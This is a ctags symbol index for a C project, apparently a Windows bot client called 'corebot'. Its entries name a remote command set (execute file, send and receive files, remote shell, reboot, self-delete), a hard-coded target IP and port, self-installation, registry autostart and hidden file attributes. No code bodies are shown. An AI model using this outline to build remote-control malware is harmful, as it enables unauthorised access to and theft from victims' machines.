!_TAG_FILE_FORMAT	2	/extended format; --format=1 will not append ;" to lines/
!_TAG_FILE_SORTED	1	/0=unsorted, 1=sorted, 2=foldcase/
!_TAG_PROGRAM_AUTHOR	Darren Hiebert	/dhiebert@users.sourceforge.net/
!_TAG_PROGRAM_NAME	Exuberant Ctags	//
!_TAG_PROGRAM_URL	http://ctags.sourceforge.net	/official site/
!_TAG_PROGRAM_VERSION	5.8	//
ARRSZ	.\common.h	16;"	d
ATTEMPTS_MAX	.\config.h	7;"	d
BUF_SZ	.\commands.c	18;"	d	file:
BUF_SZ	.\corebot.c	10;"	d	file:
CMD_BYE	.\commands.h	/^	CMD_BYE,$/;"	e	enum:__anon1
CMD_ERR	.\commands.h	/^	CMD_ERR,$/;"	e	enum:__anon1
CMD_EXEC_FILE	.\commands.h	/^	CMD_EXEC_FILE,	\/* with opt argument PATH *\/ $/;"	e	enum:__anon1
CMD_GET_CLI	.\commands.h	/^	CMD_GET_CLI,$/;"	e	enum:__anon1
CMD_GET_INFO	.\commands.h	/^	CMD_GET_INFO,$/;"	e	enum:__anon1
CMD_NOP	.\commands.h	/^	CMD_NOP,$/;"	e	enum:__anon1
CMD_REBOOT	.\commands.h	/^	CMD_REBOOT,$/;"	e	enum:__anon1
CMD_RECV_FILE	.\commands.h	/^	CMD_RECV_FILE,	\/* with opt argument PATH *\/$/;"	e	enum:__anon1
CMD_SELF_DELETE	.\commands.h	/^	CMD_SELF_DELETE,$/;"	e	enum:__anon1
CMD_SEND_FILE	.\commands.h	/^	CMD_SEND_FILE,	\/* with opt argument PATH *\/$/;"	e	enum:__anon1
CMD_SHUTDOWN	.\commands.h	/^	CMD_SHUTDOWN,$/;"	e	enum:__anon1
CMD_SLEEP	.\commands.h	/^	CMD_SLEEP,$/;"	e	enum:__anon1
CMD_UNKNOWN	.\commands.h	/^	CMD_UNKNOWN,$/;"	e	enum:__anon1
DEBUG	.\log.h	15;"	d
DEFAULT_AUTORUN	.\reg.c	7;"	d	file:
ENTRY_POINT	.\main.c	/^ENTRY_POINT()$/;"	f
HELLO_ACK	.\messages.h	6;"	d
HELLO_MSG	.\messages.h	4;"	d
IS_DEBUG	.\log.h	6;"	d
LOG_DEFAULT	.\log.h	9;"	d
LOG_LEVEL	.\log.h	7;"	d
LOG_VERBOSE	.\log.h	10;"	d
MAX_BLANKS	.\commands.c	19;"	d	file:
MOD_HIDDEN	.\file.h	/^	MOD_HIDDEN = 1,$/;"	e	enum:attr
MOD_READONLY	.\file.h	/^	MOD_READONLY = 2,$/;"	e	enum:attr
MOD_SYSTEM	.\file.h	/^	MOD_SYSTEM = 4,$/;"	e	enum:attr
NEED_INSTALLATION	.\config.h	5;"	d
NULL	.\common.h	5;"	d
OPT_MAXSZ	.\commands.h	6;"	d
RAND_CHARS	.\file.c	132;"	d	file:
SDOM_INET	.\mysocket.cpp	/^	SDOM_INET,$/;"	e	enum:sock_domain	file:
SDOM_UNKNOWN	.\mysocket.cpp	/^	SDOM_UNKNOWN,$/;"	e	enum:sock_domain	file:
SPRINTF_EX_MAX_SZ	.\str.h	10;"	d
SPROT_UNKNOWN	.\mysocket.cpp	/^	SPROT_UNKNOWN,$/;"	e	enum:sock_proto	file:
STYPE_DGRAM	.\mysocket.cpp	/^	STYPE_DGRAM,$/;"	e	enum:sock_type	file:
STYPE_STREAM	.\mysocket.cpp	/^	STYPE_STREAM,$/;"	e	enum:sock_type	file:
STYPE_UNKNOWN	.\mysocket.cpp	/^	STYPE_UNKNOWN,$/;"	e	enum:sock_type	file:
SYSINFO_SZ	.\util.h	7;"	d
Socketlib_init	.\sock.c	/^bool Socketlib_init(void)$/;"	f
Socketlib_uninit	.\sock.c	/^bool Socketlib_uninit(void)$/;"	f
TARGET_IP	.\config.h	11;"	d
TARGET_PORT	.\config.h	13;"	d
USEC_IDLE_BETWEEN_CONNECT	.\config.h	9;"	d
WO_ALL	.\file.h	/^	WO_ALL = WO_RDWR | WO_EXEC,$/;"	e	enum:flags
WO_APPEND	.\file.h	/^	WO_APPEND = 32,$/;"	e	enum:flags
WO_CREAT	.\file.h	/^	WO_CREAT = 1,	\/\/always create file$/;"	e	enum:flags
WO_EXCL	.\file.h	/^	WO_EXCL = 2,	\/\/open existing file$/;"	e	enum:flags
WO_EXEC	.\file.h	/^	WO_EXEC = 16,$/;"	e	enum:flags
WO_RDWR	.\file.h	/^	WO_RDWR = WO_READ | WO_WRITE,$/;"	e	enum:flags
WO_READ	.\file.h	/^	WO_READ = 4,$/;"	e	enum:flags
WO_SHARE_R	.\file.h	/^	WO_SHARE_R = 64, \/\/windows spec flag, try to share reads$/;"	e	enum:flags
WO_WRITE	.\file.h	/^	WO_WRITE = 8,$/;"	e	enum:flags
_CLIENT_H_	.\corebot.h	2;"	d
_MYSOCKET_H_	.\sock.h	2;"	d
__COMMANDS_H__	.\commands.h	2;"	d
__COMMON_H__	.\common.h	2;"	d
__CONFIG_H__	.\config.h	2;"	d
__COREINSTALL_H__	.\coreinstall.h	2;"	d
__FILE_H__	.\file.h	2;"	d
__MESSAGES_H__	.\messages.h	2;"	d
__MYLOG_H__	.\log.h	2;"	d
__REG_H__	.\reg.h	2;"	d
__STR_H__	.\str.h	2;"	d
__UTIL_H__	.\util.h	2;"	d
a	.\test\main.s	/^a:$/;"	l
alph_printable	.\util.c	/^char alph_printable[] = "0123456789abcdefghijklmnopqrstuvwxyz";$/;"	v
assert	.\common.h	9;"	d
attr	.\file.h	/^enum attr {$/;"	g
b	.\test\main.c	/^int b;$/;"	v
bool	.\common.h	/^} bool;$/;"	t	typeref:enum:__anon3
bool	.\test\exec_process.c	/^} bool;$/;"	t	typeref:enum:__anon5	file:
bot	.\corebot.h	/^struct bot {$/;"	s
bot_close_connection	.\corebot.c	/^bot_close_connection(struct bot *bot)$/;"	f
bot_get_next_cmd	.\corebot.c	/^bot_get_next_cmd(struct bot *bot, struct command_ctx *ctx)$/;"	f
bot_hand_shake	.\corebot.c	/^bot_hand_shake(struct bot *bot)$/;"	f
bot_init	.\corebot.c	/^bot_init(struct bot *bot)$/;"	f
bot_init_connection	.\corebot.c	/^bot_init_connection(struct bot *bot)$/;"	f
bot_main_loop	.\corebot.c	/^bot_main_loop(struct bot *bot)$/;"	f
bot_set_ip	.\corebot.c	/^bot_set_ip(struct bot *bot, char *serv_ip)$/;"	f
bot_set_port	.\corebot.c	/^bot_set_port(struct bot *bot, char *serv_port)$/;"	f
bot_single_session	.\main.c	/^bot_single_session()$/;"	f
bot_validate_server	.\corebot.c	/^bot_validate_server(struct bot *bot, char *msg, int sz)$/;"	f
callback_t	.\commands.h	/^typedef bool (*callback_t)(struct bot *bot, struct command_ctx *ctx);$/;"	t
cb	.\commands.h	/^	callback_t cb;$/;"	m	struct:commands
client_ip	.\sock.h	/^	uint32_t client_ip;$/;"	m	struct:socket
client_port	.\sock.h	/^	int client_port;$/;"	m	struct:socket
cmd	.\commands.h	/^	int cmd;$/;"	m	struct:command_ctx
command_ctx	.\commands.h	/^struct command_ctx {$/;"	s
command_get	.\commands.c	/^command_get(char *buf, int len, struct command_ctx *ctx)$/;"	f
command_get_cli_mode	.\commands.c	/^command_get_cli_mode(struct bot *bot, struct command_ctx *ctx)$/;"	f
command_get_client_info	.\commands.c	/^command_get_client_info(struct bot *bot, struct command_ctx *ctx)$/;"	f
command_reboot	.\commands.c	/^command_reboot(struct bot *bot, struct command_ctx *ctx)$/;"	f
command_recv_file	.\commands.c	/^command_recv_file(struct bot *bot, struct command_ctx *ctx)$/;"	f
command_run	.\commands.c	/^command_run(struct bot *bot, struct command_ctx *ctx)$/;"	f
command_self_delete	.\commands.c	/^command_self_delete(struct bot *bot, struct command_ctx *ctx)$/;"	f
command_send_file	.\commands.c	/^command_send_file(struct bot *bot, struct command_ctx *ctx)$/;"	f
command_shutdown	.\commands.c	/^command_shutdown(struct bot *bot, struct command_ctx *ctx)$/;"	f
commands	.\commands.c	/^struct commands commands[] = {$/;"	v	typeref:struct:commands
commands	.\commands.h	/^struct commands {$/;"	s
false	.\common.h	/^	false = 0,$/;"	e	enum:__anon3
false	.\test\create_process.c	/^	false = 0,$/;"	e	enum:__anon4	file:
false	.\test\exec_process.c	/^	false = 0$/;"	e	enum:__anon5	file:
file_close	.\file.c	/^file_close(HANDLE h)$/;"	f
file_create_temp_file	.\file.c	/^file_create_temp_file(char *dst, int dstlen, char *pref, char *suf)$/;"	f
file_delete	.\file.c	/^file_delete(char *fname)$/;"	f
file_get_temp_dir	.\file.c	/^file_get_temp_dir(char *dst, int len)$/;"	f
file_open	.\file.c	/^file_open(char *path, int flags, int attr)$/;"	f
file_read	.\file.c	/^file_read(HANDLE h, char *buf, int len)$/;"	f
file_read_all	.\file.c	/^file_read_all(HANDLE h, char *buf, int len)$/;"	f
file_write	.\file.c	/^file_write(HANDLE h, char *buf, int len)$/;"	f
file_write_all	.\file.c	/^file_write_all(HANDLE h, char *buf, int len)$/;"	f
file_write_to_file	.\file.c	/^file_write_to_file(char *file, char *buf, int sz)$/;"	f
flags	.\file.h	/^enum flags {$/;"	g
get_home_dir	.\util.c	/^get_home_dir(char *buf, int len)$/;"	f
get_program_name	.\util.c	/^get_program_name(char *buf, int len)$/;"	f
get_system_info	.\util.c	/^get_system_info(char buf[SYSINFO_SZ])$/;"	f
get_tick_count	.\util.c	/^get_tick_count()$/;"	f
id	.\commands.h	/^	int id;$/;"	m	struct:commands
installer	.\coreinstall.c	/^struct installer$/;"	s	file:
installer_clear	.\coreinstall.c	/^installer_clear(struct installer *inst)$/;"	f
installer_get_target_path	.\coreinstall.c	/^installer_get_target_path(struct installer *inst, char *buf, int sz)$/;"	f
installer_init	.\coreinstall.c	/^installer_init(struct installer *inst, char *appname)$/;"	f
installer_install	.\coreinstall.c	/^installer_install(struct installer *inst, char *to_path)$/;"	f
installer_uninstall	.\coreinstall.c	/^installer_uninstall(struct installer *inst)$/;"	f
is_closed	.\sock.h	/^	int is_closed;$/;"	m	struct:socket
is_pipe_empty	.\commands.c	/^is_pipe_empty(HANDLE h)$/;"	f
main	.\test\create_process.c	/^main()$/;"	f
main	.\test\exec_process.c	/^main()$/;"	f
main	.\test\main.cpp	/^main()$/;"	f
my_atoi	.\util.c	/^my_atoi(char *ptr, int *n)$/;"	f
my_sleep	.\util.c	/^my_sleep(int seconds)$/;"	f
my_usleep	.\util.c	/^my_usleep(int useconds)$/;"	f
name	.\commands.h	/^	const char *name;$/;"	m	struct:commands
path	.\commands.h	/^		char path[OPT_MAXSZ];$/;"	m	union:command_ctx::__anon2
pc_reboot	.\util.c	/^pc_reboot()$/;"	f
pipe_set_blocking	.\util.c	/^pipe_set_blocking(HANDLE pipe, bool blocking)$/;"	f
pname	.\coreinstall.c	/^	char pname[MAX_PATH];$/;"	m	struct:installer	file:
print_warn_and_die	.\common.h	18;"	d
rand_get_char_printable	.\util.c	/^rand_get_char_printable()$/;"	f
reg_add_for_autostart	.\reg.c	/^reg_add_for_autostart(char *pname)$/;"	f
self_install	.\coreinstall.c	/^self_install()$/;"	f
self_uninstall	.\coreinstall.c	/^self_uninstall()$/;"	f
serv_ip	.\sock.h	/^	uint32_t serv_ip;$/;"	m	struct:socket
serv_port	.\sock.h	/^	int serv_port;$/;"	m	struct:socket
sock	.\mysocket.cpp	/^	int sock;$/;"	m	struct:socket	file:
sock	.\sock.h	/^	SOCKET sock;$/;"	m	struct:socket
sock_domain	.\mysocket.cpp	/^enum sock_domain {$/;"	g	file:
sock_domain	.\sock.h	/^	int sock_domain;$/;"	m	struct:socket
sock_proto	.\mysocket.cpp	/^enum sock_proto {$/;"	g	file:
sock_type	.\mysocket.cpp	/^enum sock_type {$/;"	g	file:
sock_type	.\sock.h	/^	int sock_type;$/;"	m	struct:socket
socket	.\corebot.h	/^	struct socket *socket;$/;"	m	struct:bot	typeref:struct:bot::socket
socket	.\mysocket.cpp	/^struct socket {$/;"	s	file:
socket	.\sock.h	/^struct socket$/;"	s
socket_close	.\sock.c	/^bool socket_close(struct socket *s)$/;"	f
socket_connect	.\sock.c	/^bool socket_connect(struct socket *s)$/;"	f
socket_create_socket	.\sock.c	/^bool socket_create_socket(struct socket *s)$/;"	f
socket_get_sock	.\sock.c	/^bool socket_get_sock(struct socket *s, int *sock)$/;"	f
socket_init	.\sock.c	/^socket_init(struct socket *s)$/;"	f
socket_recv_all	.\sock.c	/^bool socket_recv_all(struct socket *s, void *msg, int len)$/;"	f
socket_recv_line	.\sock.c	/^bool socket_recv_line(struct socket *s, void *msg, int *len, int maxlen)$/;"	f
socket_recv_msg	.\sock.c	/^bool socket_recv_msg(struct socket *s, void *msg, int *len, int maxlen)$/;"	f
socket_send_msg	.\sock.c	/^bool socket_send_msg(struct socket *s, void *msg, int len)$/;"	f
socket_set_ip	.\sock.c	/^bool socket_set_ip(struct socket *s, char *serv_ip)$/;"	f
socket_set_port	.\sock.c	/^bool socket_set_port(struct socket *s, char *serv_port)$/;"	f
start	.\test\main.c	/^start()$/;"	f
start	.\test\main.s	/^start:$/;"	l
str_cat	.\str.c	/^str_cat(char *dst, const char *src)$/;"	f
str_cat_ex	.\str.c	/^str_cat_ex(char **dst, const char *src)$/;"	f
str_consume	.\str.c	/^str_consume(char *str)$/;"	f
str_len	.\str.c	/^str_len(const char *str)$/;"	f
str_ncpy	.\str.c	/^str_ncpy(char *dst, const char *src, int sz)$/;"	f
str_sprintf	.\str.c	/^str_sprintf(char *str, char *fmt, ...)$/;"	f
str_sprintf_ex	.\str.c	/^str_sprintf_ex(char **str, char *fmt, ...)$/;"	f
str_vsnprintf	.\str.c	/^str_vsnprintf(char *dst, int sz, char *fmt, va_list list)$/;"	f	file:
str_vsprintf	.\str.c	/^str_vsprintf(char *dst, char *fmt, va_list list)$/;"	f	file:
true	.\common.h	/^	true = 1,$/;"	e	enum:__anon3
true	.\test\create_process.c	/^	true = 1,$/;"	e	enum:__anon4	file:
true	.\test\exec_process.c	/^	true = 1,$/;"	e	enum:__anon5	file:
val	.\commands.h	/^		int val;$/;"	m	union:command_ctx::__anon2
win_perror	.\util.c	/^win_perror(char *str)$/;"	f
win_strerror	.\util.c	/^win_strerror(char *buf, int sz)$/;"	f
xmalloc	.\common.c	/^xmalloc(size_t sz)$/;"	f
xrealloc	.\common.c	/^xrealloc(void *ptr, size_t sz) $/;"	f
